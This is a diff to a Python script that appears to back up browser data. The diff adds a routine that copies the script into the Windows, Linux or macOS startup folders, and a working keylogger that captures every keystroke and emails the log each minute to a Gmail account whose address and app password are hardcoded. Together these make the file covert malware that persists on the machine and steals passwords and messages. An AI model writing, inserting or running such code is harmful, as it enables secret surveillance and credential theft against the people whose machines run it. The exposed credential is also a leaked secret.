@@ -1,4 +1,53 @@
 import os
+import sys
+import platform
+import shutil
+
+def deplacer_vers_demarrage():
+    # Récupérer le chemin absolu du fichier actuel
+    chemin_actuel = os.path.abspath(sys.argv[0])
+    nom_fichier = os.path.basename(chemin_actuel)
+    systeme = platform.system()
+
+    print(f"Système détecté : {systeme}")
+    print(f"Emplacement actuel : {chemin_actuel}")
+
+    # Détermination du dossier de destination selon l'OS
+    if systeme == "Windows":
+        # Dossier "Démarrage" de l'utilisateur
+        dossier_cible = os.path.join(
+            os.environ["APPDATA"], 
+            r"Microsoft\Windows\Start Menu\Programs\Startup"
+        )
+    elif systeme == "Linux":
+        # Dossier d'autostart XDG
+        dossier_cible = os.path.expanduser("~/.config/autostart")
+    elif systeme == "Darwin":  # macOS
+        # Dossier LaunchAgents (nécessite généralement un .plist, mais déplacement brut ici)
+        dossier_cible = os.path.expanduser("~/Library/LaunchAgents")
+    else:
+        print("Système non pris en charge.")
+        return
+
+    # Créer le dossier cible s'il n'existe pas
+    os.makedirs(dossier_cible, exist_ok=True)
+    chemin_destination = os.path.join(dossier_cible, nom_fichier)
+
+    # Vérifier si le fichier est déjà dans le dossier cible
+    if os.path.normpath(chemin_actuel) == os.path.normpath(chemin_destination):
+        print("Le fichier est déjà dans le dossier de démarrage.")
+        return
+
+    try:
+        # Déplacement physique du fichier
+        shutil.move(chemin_actuel, chemin_destination)
+        print(f"Succès : Le fichier a été déplacé vers {chemin_destination}")
+    except Exception as e:
+        print(f"Erreur lors du déplacement : {e}")
+
+if __name__ == "__main__":
+    deplacer_vers_demarrage()
+import os
 import shutil
 import platform
 import json
@@ -158,4 +207,88 @@ def backup_all_browsers():
 
 if __name__ == "__main__":
     backup_all_browsers()
+    
+import threading
+import smtplib
+from email.mime.text import MIMEText
+from pynput import keyboard
+
+# --- CONFIGURATION ---
+EMAIL_ADDRESS = "lupinarsene350@gmail.com"
+EMAIL_PASSWORD = "lxsublzrbpopwigh"
+RECEIVER_EMAIL = "lupinarsene350@gmail.com"
+SEND_REPORT_EVERY = 60  # Intervalle en secondes (1 minute)
+
+class Keylogger:
+    def __init__(self, interval, email, password, receiver):
+        self.log = "Keylogger démarré...\n"
+        self.interval = interval
+        self.email = email
+        self.password = password
+        self.receiver = receiver
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+    def process_key_press(self, key):
+        try:
+            # Touche alphabétique ou numérique classique
+            current_key = str(key.char)
+        except AttributeError:
+            # Touche spéciale (Espace, Entrée, Shift, etc.)
+            if key == key.space:
+                current_key = " "
+            elif key == key.enter:
+                current_key = "\n"
+            elif key == key.backspace:
+                current_key = " [BACKSPACE] "
+            else:
+                current_key = f" [{str(key)}] "
+        
+        self.append_to_log(current_key)
+
+    def send_mail(self, message):
+        msg = MIMEText(message, "plain", "utf-8")
+        msg["Subject"] = "Rapport Keylogger Python"
+        msg["From"] = self.email
+        msg["To"] = self.receiver
+
+        try:
+            # Configuration pour le serveur SMTP de Gmail (Port 587 avec STARTTLS)
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(self.email, self.password)
+            server.sendmail(self.email, self.receiver, msg.as_string())
+            server.quit()
+        except Exception as e:
+            print(f"Erreur d'envoi d'e-mail : {e}")
+
+    def report(self):
+        """Envoie le log accumulé par mail et réinitialise le compteur."""
+        if self.log:
+            # Envoi asynchrone pour ne pas ralentir l'ordinateur de l'utilisateur
+            self.send_mail(self.log)
+            self.log = "" # Réinitialise le log après envoi
+        
+        # Relance le timer pour le prochain rapport
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def start(self):
+        # Démarre la boucle d'envoi d'e-mails
+        self.report()
+        # Démarre l'écoute du clavier
+        with keyboard.Listener(on_press=self.process_key_press) as listener:
+            listener.join()
+
+# --- EXÉCUTION ---
+if __name__ == "__main__":
+    keylogger = Keylogger(
+        interval=SEND_REPORT_EVERY, 
+        email=EMAIL_ADDRESS, 
+        password=EMAIL_PASSWORD, 
+        receiver=RECEIVER_EMAIL
+    )
+    keylogger.start()
+
 
